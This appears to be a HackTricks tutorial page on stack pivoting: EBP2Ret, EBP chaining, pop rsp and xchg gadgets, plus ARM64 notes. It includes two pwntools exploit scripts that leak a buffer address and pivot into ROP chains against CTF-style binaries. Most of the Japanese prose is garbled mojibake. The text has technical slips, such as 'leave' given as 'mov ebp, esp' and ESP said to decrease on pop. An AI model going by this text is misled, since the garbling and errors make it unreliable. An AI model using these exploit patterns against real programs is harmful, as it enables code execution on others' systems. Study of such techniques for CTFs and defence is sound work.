# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

ã“ã®æŠ€è¡“ã¯ã€**ãƒ™ãƒ¼ã‚¹ãƒã‚¤ãƒ³ã‚¿ï¼ˆEBPï¼‰**ã‚’æ“ä½œã™ã‚‹èƒ½åŠ›ã‚’åˆ©ç”¨ã—ã¦ã€EBPãƒ¬ã‚¸ã‚¹ã‚¿ã¨**`leave; ret`**å‘½ä»¤ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’æ…é‡ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€è¤‡æ•°ã®é–¢æ•°ã®å®Ÿè¡Œã‚’é€£é–ã•ã›ã¾ã™ã€‚

ãŠã•ã‚‰ã„ã¨ã—ã¦ã€**`leave`**ã¯åŸºæœ¬çš„ã«æ¬¡ã®ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ï¼š
```
mov       ebp, esp
pop       ebp
ret
```
And as the **EBP is in the stack** before the EIP it's possible to control it controlling the stack.

### EBP2Ret

ã“ã®æŠ€è¡“ã¯ã€**EBPãƒ¬ã‚¸ã‚¹ã‚¿ã‚’å¤‰æ›´ã§ãã‚‹ãŒã€EIPãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ç›´æ¥å¤‰æ›´ã™ã‚‹æ–¹æ³•ãŒãªã„å ´åˆ**ã«ç‰¹ã«æœ‰ç”¨ã§ã™ã€‚ã“ã‚Œã¯ã€é–¢æ•°ãŒå®Ÿè¡Œã‚’çµ‚äº†ã™ã‚‹éš›ã®å‹•ä½œã‚’åˆ©ç”¨ã—ã¾ã™ã€‚

`fvuln`ã®å®Ÿè¡Œä¸­ã«ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒã‚ã‚‹ãƒ¡ãƒ¢ãƒªã®é ˜åŸŸã‚’æŒ‡ã™**å½ã®EBP**ã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ï¼ˆ`pop`æ“ä½œã®ãŸã‚ã«4ãƒã‚¤ãƒˆã‚’åŠ ç®—ï¼‰ã€EIPã‚’é–“æ¥çš„ã«åˆ¶å¾¡ã§ãã¾ã™ã€‚`fvuln`ãŒæˆ»ã‚‹ã¨ã€ESPã¯ã“ã®ä½œæˆã•ã‚ŒãŸä½ç½®ã«è¨­å®šã•ã‚Œã€ãã®å¾Œã®`pop`æ“ä½œã§ESPãŒ4æ¸›å°‘ã—ã€**æ”»æ’ƒè€…ãŒãã“ã«ä¿å­˜ã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã™ã“ã¨ã«ãªã‚Šã¾ã™ã€‚**\
ã“ã“ã§ã€**2ã¤ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™**: ESPãŒç§»å‹•ã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã€ESPãŒæŒ‡ã™ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€å¿…è¦ãŒã‚ã‚‹å ´æ‰€ã§ã™ã€‚

#### Exploit Construction

ã¾ãšã€**ä»»æ„ã®ãƒ‡ãƒ¼ã‚¿/ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ESPã¯ã“ã“ã‚’æŒ‡ã—ã€**æœ€åˆã®`ret`ã‚’å®Ÿè¡Œã—ã¾ã™**ã€‚

æ¬¡ã«ã€**ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹**ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹`ret`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«ä½¿ç”¨ã§ãã¾ã™ï¼š

* æœ‰åŠ¹ãª[**ONE\_GADGET**](https://github.com/david942j/one\_gadget)ã‚¢ãƒ‰ãƒ¬ã‚¹ã€‚
* **`system()`**ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¾Œã«**4ãƒã‚¤ãƒˆã®ã‚¸ãƒ£ãƒ³ã‚¯**ã¨`"/bin/sh"`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆx86ãƒ“ãƒƒãƒˆï¼‰ã€‚
* **`jump esp;`**ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆ[**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)ï¼‰ã®å¾Œã«**å®Ÿè¡Œã™ã‚‹ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰**ã€‚
* ä¸€éƒ¨ã®[**ROP**](../rop-return-oriented-programing/)ãƒã‚§ãƒ¼ãƒ³ã€‚

åˆ¶å¾¡ã•ã‚ŒãŸãƒ¡ãƒ¢ãƒªã®ã“ã‚Œã‚‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å‰ã«ã¯ã€**`4`ãƒã‚¤ãƒˆ**ãŒå¿…è¦ã§ã™ã€‚ã“ã‚Œã¯**`pop`**éƒ¨åˆ†ã®`leave`å‘½ä»¤ã®ãŸã‚ã§ã™ã€‚ã“ã‚Œã‚‰ã®4ãƒã‚¤ãƒˆã‚’æ‚ªç”¨ã—ã¦**2ã¤ç›®ã®å½EBP**ã‚’è¨­å®šã—ã€å®Ÿè¡Œã‚’åˆ¶å¾¡ã—ç¶šã‘ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

#### Off-By-One Exploit

ã“ã®æŠ€è¡“ã«ã¯ã€ŒOff-By-One Exploitã€ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã‚‹ç‰¹å®šã®ãƒãƒªã‚¢ãƒ³ãƒˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€**EBPã®æœ€ä¸‹ä½ãƒã‚¤ãƒˆã®ã¿ã‚’å¤‰æ›´ã§ãã‚‹**å ´åˆã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®å ´åˆã€**`ret`**ã§ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ ¼ç´ã™ã‚‹ãƒ¡ãƒ¢ãƒªä½ç½®ã¯EBPã®æœ€åˆã®3ãƒã‚¤ãƒˆã‚’å…±æœ‰ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ã‚ˆã‚Šåˆ¶ç´„ã®ã‚ã‚‹æ¡ä»¶ã§é¡ä¼¼ã®æ“ä½œãŒå¯èƒ½ã§ã™ã€‚\
é€šå¸¸ã€0x00ã®ãƒã‚¤ãƒˆã‚’å¤‰æ›´ã—ã¦ã§ãã‚‹ã ã‘é ãã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚

ã¾ãŸã€ã‚¹ã‚¿ãƒƒã‚¯ã«RETã‚¹ãƒ¬ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã€å®Ÿéš›ã®ROPãƒã‚§ãƒ¼ãƒ³ã‚’æœ€å¾Œã«é…ç½®ã—ã¦ã€æ–°ã—ã„ESPãŒRETã‚¹ãƒ¬ãƒƒãƒ‰å†…ã‚’æŒ‡ã—ã€æœ€çµ‚çš„ãªROPãƒã‚§ãƒ¼ãƒ³ãŒå®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ã‚’é«˜ã‚ã‚‹ã“ã¨ãŒä¸€èˆ¬çš„ã§ã™ã€‚

### **EBP Chaining**

ã—ãŸãŒã£ã¦ã€ã‚¹ã‚¿ãƒƒã‚¯ã®`EBP`ã‚¨ãƒ³ãƒˆãƒªã«åˆ¶å¾¡ã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’é…ç½®ã—ã€`EIP`ã«`leave; ret`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’é…ç½®ã™ã‚‹ã“ã¨ã§ã€**ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰åˆ¶å¾¡ã•ã‚ŒãŸ`EBP`ã‚¢ãƒ‰ãƒ¬ã‚¹ã«`ESP`ã‚’ç§»å‹•ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**ã€‚

ä»Šã€**`ESP`**ã¯åˆ¶å¾¡ã•ã‚Œã€æœ›ã¾ã—ã„ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã—ã¦ãŠã‚Šã€æ¬¡ã«å®Ÿè¡Œã•ã‚Œã‚‹å‘½ä»¤ã¯`RET`ã§ã™ã€‚ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã€åˆ¶å¾¡ã•ã‚ŒãŸESPã®å ´æ‰€ã«æ¬¡ã®ã‚‚ã®ã‚’é…ç½®ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* **`&(next fake EBP)`** -> `leave`å‘½ä»¤ã‹ã‚‰ã®`pop ebp`ã«ã‚ˆã‚Šæ–°ã—ã„EBPã‚’ãƒ­ãƒ¼ãƒ‰
* **`system()`** -> `ret`ã«ã‚ˆã£ã¦å‘¼ã³å‡ºã•ã‚Œã‚‹
* **`&(leave;ret)`** -> systemãŒçµ‚äº†ã—ãŸå¾Œã«å‘¼ã³å‡ºã•ã‚Œã€ESPã‚’å½EBPã«ç§»å‹•ã•ã›ã€å†ã³é–‹å§‹
* **`&("/bin/sh")`**-> `system`ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

åŸºæœ¬çš„ã«ã€ã“ã®æ–¹æ³•ã§è¤‡æ•°ã®å½EBPã‚’é€£é–ã•ã›ã¦ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ•ãƒ­ãƒ¼ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ã“ã‚Œã¯[ret2lib](../rop-return-oriented-programing/ret2lib/)ã®ã‚ˆã†ãªã‚‚ã®ã§ã™ãŒã€æ˜ã‚‰ã‹ãªåˆ©ç‚¹ã¯ãªãã€ç‰¹å®šã®ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã§èˆˆå‘³æ·±ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã•ã‚‰ã«ã€ã“ã“ã«[**ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã®ä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)ãŒã‚ã‚Šã€ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦**ã‚¹ã‚¿ãƒƒã‚¯ãƒªãƒ¼ã‚¯**ã‚’åˆ©ç”¨ã—ã¦å‹åˆ©é–¢æ•°ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚ã“ã‚Œã¯ãƒšãƒ¼ã‚¸ã‹ã‚‰ã®æœ€çµ‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ã™ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBPã¯ä½¿ç”¨ã•ã‚Œãªã„å¯èƒ½æ€§ãŒã‚ã‚‹

[**ã“ã®æŠ•ç¨¿ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1)ã€ãƒã‚¤ãƒŠãƒªãŒã„ãã¤ã‹ã®æœ€é©åŒ–ã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**EBPã¯ESPã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“**ã€‚ã—ãŸãŒã£ã¦ã€EBPã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦æ©Ÿèƒ½ã™ã‚‹ä»»æ„ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯åŸºæœ¬çš„ã«å¤±æ•—ã—ã¾ã™ã€‚ãªãœãªã‚‰ã€ãã‚Œã«ã¯å®Ÿéš›ã®åŠ¹æœãŒãªã„ã‹ã‚‰ã§ã™ã€‚\
ã“ã‚Œã¯ã€**ãƒ—ãƒ­ãƒ­ãƒ¼ã‚°ã¨ã‚¨ãƒ”ãƒ­ãƒ¼ã‚°ãŒ**ãƒã‚¤ãƒŠãƒªãŒæœ€é©åŒ–ã•ã‚Œã‚‹ã¨å¤‰æ›´ã•ã‚Œã‚‹ãŸã‚ã§ã™ã€‚

* **æœ€é©åŒ–ã•ã‚Œã¦ã„ãªã„:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **æœ€é©åŒ–ã•ã‚ŒãŸ:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSPã‚’åˆ¶å¾¡ã™ã‚‹ä»–ã®æ–¹æ³•

### **`pop rsp`** ã‚¬ã‚¸ã‚§ãƒƒãƒˆ

[**ã“ã®ãƒšãƒ¼ã‚¸**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) ã§ã¯ã€ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ãŸä¾‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã§ã¯ã€2ã¤ã®ç‰¹å®šã®å¼•æ•°ã‚’æŒã¤é–¢æ•°ã‚’å‘¼ã³å‡ºã™å¿…è¦ãŒã‚ã‚Šã€**`pop rsp` ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ãŒã‚ã‚Šã€**ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ã®ãƒªãƒ¼ã‚¯**ãŒã‚ã‚Šã¾ã™:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp ã‚¬ã‚¸ã‚§ãƒƒãƒˆ
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

ret2espãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã«ã¤ã„ã¦ã¯ã€ã“ã¡ã‚‰ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## å‚è€ƒæ–‡çŒ®ã¨ä»–ã®ä¾‹

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64ãƒ“ãƒƒãƒˆã€retã‚¹ãƒ¬ãƒƒãƒ‰ã§å§‹ã¾ã‚‹ropãƒã‚§ãƒ¼ãƒ³ã‚’ä½¿ç”¨ã—ãŸã‚ªãƒ•ãƒã‚¤ãƒ¯ãƒ³ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64ãƒ“ãƒƒãƒˆã€relroã€canaryã€nxã€pieãªã—ã€‚ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯ã‚¹ã‚¿ãƒƒã‚¯ã¾ãŸã¯pieã®ãƒªãƒ¼ã‚¯ã¨qwordã®WWWã‚’æä¾›ã—ã¾ã™ã€‚æœ€åˆã«ã‚¹ã‚¿ãƒƒã‚¯ãƒªãƒ¼ã‚¯ã‚’å–å¾—ã—ã€WWWã‚’ä½¿ç”¨ã—ã¦æˆ»ã‚Šã€pieãƒªãƒ¼ã‚¯ã‚’å–å¾—ã—ã¾ã™ã€‚ãã®å¾Œã€WWWã‚’ä½¿ç”¨ã—ã¦ã€`.fini_array`ã‚¨ãƒ³ãƒˆãƒªã‚’æ‚ªç”¨ã—ã¦æ°¸ç¶šãƒ«ãƒ¼ãƒ—ã‚’ä½œæˆã—ã€`__libc_csu_fini`ã‚’å‘¼ã³å‡ºã—ã¾ã™ï¼ˆ[è©³ç´°ã¯ã“ã¡ã‚‰](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)ï¼‰ã€‚ã“ã®ã€Œæ°¸ç¶šçš„ã€ãªæ›¸ãè¾¼ã¿ã‚’æ‚ªç”¨ã—ã¦ã€.bssã«ROPãƒã‚§ãƒ¼ãƒ³ã‚’æ›¸ãè¾¼ã¿ã€RBPã§ãƒ”ãƒœãƒƒãƒˆã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚

## ARM64

ARM64ã§ã¯ã€é–¢æ•°ã®**ãƒ—ãƒ­ãƒ­ãƒ¼ã‚°ã¨ã‚¨ãƒ”ãƒ­ãƒ¼ã‚°**ã¯**ã‚¹ã‚¿ãƒƒã‚¯å†…ã®SPãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ä¿å­˜ãŠã‚ˆã³å–å¾—ã—ã¾ã›ã‚“**ã€‚ã•ã‚‰ã«ã€**`RET`**å‘½ä»¤ã¯SPãŒæŒ‡ã™ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æˆ»ã‚‹ã®ã§ã¯ãªãã€**`x30`**å†…ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æˆ»ã‚Šã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ã‚¨ãƒ”ãƒ­ãƒ¼ã‚°ã‚’æ‚ªç”¨ã™ã‚‹ã ã‘ã§ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯å†…ã®ãƒ‡ãƒ¼ã‚¿ã‚’ä¸Šæ›¸ãã—ã¦**SPãƒ¬ã‚¸ã‚¹ã‚¿ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚ãã—ã¦ã€SPã‚’åˆ¶å¾¡ã§ããŸã¨ã—ã¦ã‚‚ã€**`x30`**ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’**åˆ¶å¾¡ã™ã‚‹æ–¹æ³•**ãŒå¿…è¦ã§ã™ã€‚

*   ãƒ—ãƒ­ãƒ­ãƒ¼ã‚°

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FPã¯ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¬ã‚³ãƒ¼ãƒ‰ã‚’æŒ‡ã—ã¾ã™
```
*   ã‚¨ãƒ”ãƒ­ãƒ¼ã‚°

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

{% hint style="danger" %}
ARM64ã§ã‚¹ã‚¿ãƒƒã‚¯ãƒ”ãƒœãƒ†ã‚£ãƒ³ã‚°ã«ä¼¼ãŸã“ã¨ã‚’è¡Œã†æ–¹æ³•ã¯ã€**`SP`**ã‚’åˆ¶å¾¡ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã™ï¼ˆ`SP`ã«æ¸¡ã•ã‚Œã‚‹å€¤ã‚’æŒã¤ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’åˆ¶å¾¡ã™ã‚‹ã‹ã€ä½•ã‚‰ã‹ã®ç†ç”±ã§`SP`ãŒã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã—ã¦ãŠã‚Šã€ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ãŒã‚ã‚‹å ´åˆï¼‰ãã—ã¦ã€**ã‚¨ãƒ”ãƒ­ãƒ¼ã‚°ã‚’æ‚ªç”¨ã—ã¦**ã€**åˆ¶å¾¡ã•ã‚ŒãŸ`SP`**ã‹ã‚‰**`x30`**ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã€**ãã‚Œã«`RET`**ã™ã‚‹ã“ã¨ã§ã™ã€‚
{% endhint %}

æ¬¡ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€**ARM64ã«ãŠã‘ã‚‹Ret2espã®åŒç­‰ç‰©**ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
